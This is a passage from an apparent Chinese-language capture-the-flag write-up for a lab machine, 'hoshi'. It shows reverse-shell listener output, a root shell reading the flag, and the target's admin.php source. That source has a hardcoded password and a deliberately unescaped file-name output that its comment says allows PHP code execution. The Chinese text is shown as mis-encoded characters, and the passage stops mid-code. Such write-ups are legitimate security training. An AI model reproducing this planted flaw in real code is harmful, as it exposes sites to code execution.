PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª<br>[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/hoshi~192.168.56.121_Linux_x86_64/2025_06_23-07_10_51-343.log ğŸ“œ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>[+] Got reverse shell from hoshi-192.168.56.121-Linux-x86_64 ğŸ˜ Assigned SessionID &lt;2&gt;<br>root@hoshi:/home/welcome# <br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@hoshi:/home/welcome# cd /root<br>root@hoshi:~# cat root.txt <br>flag&#123;root-5de923e57adefd6a1fd53a6705ad6486&#125;<br>root@hoshi:~# ls<br>12345.py  congrats.txt  root.txt<br>root@hoshi:~# cat congrats.txt <br>Congratulations, Hacker!<br><br>You&#x27;ve successfully pwned this target machine! ğŸ‰ <br>Your skills are top-notch, and you&#x27;ve earned ultimate bragging rights.<br><br>Keep hacking, keep learning, and check out more challenges at maze-sec.com!<br>See you in the next challenge!<br><br>- Sublarge <br><br>root@hoshi:~# <br><br></code></pre></td></tr></table></figure><p>æ‰“çš„çœŸæ˜¯ç´¯æ­»æˆ‘äº†å”‰ï¼Œæ‹¿webshellèŠ±çš„æ—¶é—´æ¯”ææƒå’ŒrootåŠ èµ·æ¥éƒ½å¤šã€‚</p><p>åé™„ä¸Šadmin.phpçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs php">root@hoshi:/<span class="hljs-keyword">var</span>/www/html<span class="hljs-comment"># cat admin.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;åé¦ˆç®¡ç†åå° - æ˜Ÿé™…å•†åŸ&lt;/title&gt;<br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;&lt;/script&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background: linear-<span class="hljs-title function_ invoke__">gradient</span>(<span class="hljs-number">135</span>deg, #<span class="hljs-number">1e3</span>a8a, #<span class="hljs-number">6</span>b21a8);<br>            min-height: <span class="hljs-number">100</span>vh;<br>            margin: <span class="hljs-number">0</span>;<br>            padding-top: <span class="hljs-number">80</span>px;<br>        &#125;<br>        .navbar &#123;<br>            background: <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">17</span>, <span class="hljs-number">24</span>, <span class="hljs-number">39</span>, <span class="hljs-number">0.95</span>);<br>            backdrop-filter: <span class="hljs-title function_ invoke__">blur</span>(<span class="hljs-number">10</span>px);<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">2</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);<br>        &#125;<br>        .glow &#123;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">15</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">59</span>, <span class="hljs-number">130</span>, <span class="hljs-number">246</span>, <span class="hljs-number">0.5</span>);<br>        &#125;<br>        .error-message &#123;<br>            background: <span class="hljs-comment">#ef4444;</span><br>            color: white;<br>            padding: <span class="hljs-number">1</span>rem;<br>            border-radius: <span class="hljs-number">0.5</span>rem;<br>            text-align: center;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-100 <span class="hljs-title">font</span>-<span class="hljs-title">sans</span>&quot;&gt;</span><br><span class="hljs-class">    &lt;!-- å¯¼èˆªæ  --&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">nav</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span> <span class="hljs-title">fixed</span> <span class="hljs-title">top</span>-0 <span class="hljs-title">left</span>-0 <span class="hljs-title">w</span>-<span class="hljs-title">full</span> <span class="hljs-title">z</span>-50&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span> <span class="hljs-title">mx</span>-<span class="hljs-title">auto</span> <span class="hljs-title">px</span>-6 <span class="hljs-title">py</span>-4 <span class="hljs-title">flex</span> <span class="hljs-title">items</span>-<span class="hljs-title">center</span> <span class="hljs-title">justify</span>-<span class="hljs-title">between</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">flex</span> <span class="hljs-title">items</span>-<span class="hljs-title">center</span> <span class="hljs-title">space</span>-<span class="hljs-title">x</span>-4&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">QQ</span>.<span class="hljs-title">png</span>&quot; <span class="hljs-title">alt</span>=&quot;<span class="hljs-title">StarMall</span> <span class="hljs-title">Logo</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">h</span>-10 <span class="hljs-title">w</span>-10 <span class="hljs-title">rounded</span>-<span class="hljs-title">full</span> <span class="hljs-title">glow</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">max</span>-<span class="hljs-title">width</span>:48<span class="hljs-title">px</span>;<span class="hljs-title">max</span>-<span class="hljs-title">height</span>:48<span class="hljs-title">px</span>;&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">h1</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-2<span class="hljs-title">xl</span> <span class="hljs-title">font</span>-<span class="hljs-title">bold</span> <span class="hljs-title">text</span>-<span class="hljs-title">white</span>&quot;&gt;æ˜Ÿé™…å•†åŸ - ç®¡ç†åå°&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">space</span>-<span class="hljs-title">x</span>-6&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300 <span class="hljs-title">hover</span>:<span class="hljs-title">text</span>-<span class="hljs-title">blue</span>-400 <span class="hljs-title">transition</span>&quot;&gt;è¿”å›å‰å°&lt;/<span class="hljs-title">a</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">uploads</span>/&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300 <span class="hljs-title">hover</span>:<span class="hljs-title">text</span>-<span class="hljs-title">blue</span>-400 <span class="hljs-title">transition</span>&quot;&gt;åé¦ˆæ¡£æ¡ˆ&lt;/<span class="hljs-title">a</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span> <span class="hljs-title">mx</span>-<span class="hljs-title">auto</span> <span class="hljs-title">p</span>-6 <span class="hljs-title">max</span>-<span class="hljs-title">w</span>-4<span class="hljs-title">xl</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h1</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-3<span class="hljs-title">xl</span> <span class="hljs-title">font</span>-<span class="hljs-title">semibold</span> <span class="hljs-title">text</span>-<span class="hljs-title">center</span> <span class="hljs-title">mb</span>-8 <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">glow</span>&quot;&gt;åé¦ˆç®¡ç†åå°&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class">        </span><br><span class="hljs-class">        &lt;!-- ç™»å½•è¡¨å• --&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">        <span class="hljs-title">session_start</span>();</span><br><span class="hljs-class">        $<span class="hljs-title">admin_password</span> = &#x27;400-123-4567&#x27;;</span><br><span class="hljs-class">        <span class="hljs-title">if</span> ($<span class="hljs-title">_SERVER</span>[&quot;<span class="hljs-title">REQUEST_METHOD</span>&quot;] == &quot;<span class="hljs-title">POST</span>&quot; &amp;&amp; <span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">password</span>&#x27;])) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$admin_password</span>) &#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-yellow-500 text-center error-message mb-6&quot;&gt;å¯†ç é”™è¯¯ï¼&lt;/p&gt;&#x27;</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>]) || <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] !== <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">bg</span>-<span class="hljs-title">gray</span>-800 <span class="hljs-title">p</span>-8 <span class="hljs-title">rounded</span>-<span class="hljs-title">lg</span> <span class="hljs-title">glow</span> <span class="hljs-title">mb</span>-12 <span class="hljs-title">max</span>-<span class="hljs-title">w</span>-<span class="hljs-title">md</span> <span class="hljs-title">mx</span>-<span class="hljs-title">auto</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mb</span>-6&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">block</span> <span class="hljs-title">text</span>-<span class="hljs-title">sm</span> <span class="hljs-title">font</span>-<span class="hljs-title">medium</span> <span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300&quot;&gt;ç®¡ç†å‘˜å¯†ç &lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">required</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mt</span>-1 <span class="hljs-title">p</span>-3 <span class="hljs-title">w</span>-<span class="hljs-title">full</span> <span class="hljs-title">bg</span>-<span class="hljs-title">gray</span>-700 <span class="hljs-title">border</span> <span class="hljs-title">border</span>-<span class="hljs-title">gray</span>-600 <span class="hljs-title">rounded</span>-<span class="hljs-title">md</span> <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">focus</span>:<span class="hljs-title">ring</span>-2 <span class="hljs-title">focus</span>:<span class="hljs-title">ring</span>-<span class="hljs-title">blue</span>-500&quot; <span class="hljs-title">placeholder</span>=&quot;è¯·è¾“å…¥å¯†ç &quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">w</span>-<span class="hljs-title">full</span> <span class="hljs-title">bg</span>-<span class="hljs-title">blue</span>-600 <span class="hljs-title">hover</span>:<span class="hljs-title">bg</span>-<span class="hljs-title">blue</span>-700 <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">font</span>-<span class="hljs-title">bold</span> <span class="hljs-title">py</span>-3 <span class="hljs-title">px</span>-4 <span class="hljs-title">rounded</span>-<span class="hljs-title">md</span> <span class="hljs-title">transition</span> <span class="hljs-title">duration</span>-300&quot;&gt;ç™»å½•&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> &#125; <span class="hljs-title">else</span> </span>&#123; <span class="hljs-meta">?&gt;</span><br>        <br>        &lt;!-- ç»Ÿè®¡æ•°æ® --&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">bg</span>-<span class="hljs-title">gray</span>-800 <span class="hljs-title">p</span>-8 <span class="hljs-title">rounded</span>-<span class="hljs-title">lg</span> <span class="hljs-title">glow</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h2</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-2<span class="hljs-title">xl</span> <span class="hljs-title">font</span>-<span class="hljs-title">semibold</span> <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">mb</span>-6&quot;&gt;åé¦ˆç»Ÿè®¡æ¦‚è§ˆ&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">p</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300 <span class="hljs-title">mb</span>-4&quot;&gt;ä»¥ä¸‹æ˜¯ç”¨æˆ·æäº¤çš„å•†å“åé¦ˆç»Ÿè®¡æ•°æ®ï¼ŒåŒ…å«åé¦ˆæ€»æ•°ã€æ–‡ä»¶æ•°é‡åŠå­˜å‚¨å ç”¨æƒ…å†µã€‚æ‰€æœ‰åé¦ˆæ–‡ä»¶å¯åœ¨&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">uploads</span>/&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">blue</span>-500 <span class="hljs-title">hover</span>:<span class="hljs-title">underline</span>&quot;&gt;åé¦ˆæ¡£æ¡ˆç›®å½•&lt;/<span class="hljs-title">a</span>&gt;ä¸­æŸ¥çœ‹ã€‚&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">            $<span class="hljs-title">upload_dir</span> = <span class="hljs-title">__DIR__</span> . &#x27;/<span class="hljs-title">uploads</span>/&#x27;;</span><br><span class="hljs-class">            $<span class="hljs-title">metadata_file</span> = $<span class="hljs-title">upload_dir</span> . &#x27;<span class="hljs-title">feedbacks</span>.<span class="hljs-title">json</span>&#x27;;</span><br><span class="hljs-class">            </span><br><span class="hljs-class">            // ç»Ÿè®¡åé¦ˆæ€»æ•°</span><br><span class="hljs-class">            $<span class="hljs-title">total_feedbacks</span> = 0;</span><br><span class="hljs-class">            $<span class="hljs-title">user_counts</span> = [];</span><br><span class="hljs-class">            $<span class="hljs-title">product_counts</span> = [];</span><br><span class="hljs-class">            <span class="hljs-title">if</span> (<span class="hljs-title">file_exists</span>($<span class="hljs-title">metadata_file</span>)) </span>&#123;<br>                <span class="hljs-variable">$feedbacks</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$metadata_file</span>), <span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$feedbacks</span>)) &#123;<br>                    <span class="hljs-variable">$total_feedbacks</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$feedbacks</span>);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$feedbacks</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$fb</span>) &#123;<br>                        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$fb</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>                        <span class="hljs-variable">$product</span> = <span class="hljs-variable">$fb</span>[<span class="hljs-string">&#x27;product&#x27;</span>];<br>                        <span class="hljs-variable">$user_counts</span>[<span class="hljs-variable">$username</span>] = (<span class="hljs-variable">$user_counts</span>[<span class="hljs-variable">$username</span>] ?? <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>                        <span class="hljs-variable">$product_counts</span>[<span class="hljs-variable">$product</span>] = (<span class="hljs-variable">$product_counts</span>[<span class="hljs-variable">$product</span>] ?? <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-yellow-400 text-center error-message mb-4&quot;&gt;æ— æ³•è§£æåé¦ˆæ•°æ®ï¼&lt;/p&gt;&#x27;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-yellow-400 text-center error-message mb-4&quot;&gt;åé¦ˆæ•°æ®æ–‡ä»¶ä¸å­˜åœ¨ï¼&lt;/p&gt;&#x27;</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// æ–°ç»Ÿè®¡é¢æ¿ï¼Œéå†ç›®å½•å¹¶æ¸²æŸ“æ–‡ä»¶åï¼ˆä¸åšè½¬ä¹‰ï¼Œå…è®¸phpä»£ç æ‰§è¡Œï¼‰</span><br>            <span class="hljs-variable">$file_count</span> = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable">$total_size</span> = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$upload_dir</span> . <span class="hljs-string">&#x27;*.txt&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;bg-gray-700 p-6 rounded-md mb-8&quot;&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2 class=&quot;text-xl font-bold text-blue-400 mb-4&quot;&gt;åé¦ˆæ–‡ä»¶åˆ—è¡¨&lt;/h2&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;table class=&quot;min-w-full text-left text-gray-200&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;py-2&quot;&gt;æ–‡ä»¶å&lt;/th&gt;&lt;th class=&quot;py-2&quot;&gt;å¤§å°&lt;/th&gt;&lt;th class=&quot;py-2&quot;&gt;æ“ä½œ&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>                <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>);<br>                <span class="hljs-variable">$file_count</span>++;<br>                <span class="hljs-variable">$total_size</span> += <span class="hljs-variable">$size</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;py-1 px-2 border-b&quot;&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/td&gt;&lt;td class=&quot;py-1 px-2 border-b&quot;&gt;&#x27;</span> . <span class="hljs-variable">$size</span> . <span class="hljs-string">&#x27; B&lt;/td&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td class=&quot;py-1 px-2 border-b&quot;&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form method=&quot;POST&quot; style=&quot;display:inline&quot; onsubmit=&quot;return confirm(\&#x27;ç¡®å®šè¦åˆ é™¤æ­¤æ–‡ä»¶å—ï¼Ÿ\&#x27;);&quot;&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;delete_file&quot; value=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;button type=&quot;submit&quot; class=&quot;text-red-400 hover:text-red-600 underline&quot;&gt;åˆ é™¤&lt;/button&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/tbody&gt;&lt;/table&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;mt-4 text-blue-300&quot;&gt;æ€»æ–‡ä»¶æ•°: &#x27;</span> . <span class="hljs-variable">$file_count</span> . <span class="hljs-string">&#x27;ï¼Œæ€»å¤§å°: &#x27;</span> . (<span class="hljs-variable">$total_size</span> &gt; <span class="hljs-number">1024</span> ? <span class="hljs-title function_ invoke__">number_format</span>(<span class="hljs-variable">$total_size</span>/<span class="hljs-number">1024</span>,<span class="hljs-number">1</span>).<span class="hljs-string">&#x27; KB&#x27;</span> : <span class="hljs-variable">$total_size</span>.<span class="hljs-string">&#x27; B&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h3 class=&quot;text-lg font-semibold text-blue-400 mb-2&quot;&gt;ç”¨æˆ·åé¦ˆç»Ÿè®¡&lt;/h3&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;ul class=&quot;list-disc list-inside text-gray-200 mb-4&quot;&gt;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$user_counts</span>) === <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;æš‚æ— æ•°æ®&lt;/li&gt;&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$user_counts</span> <span 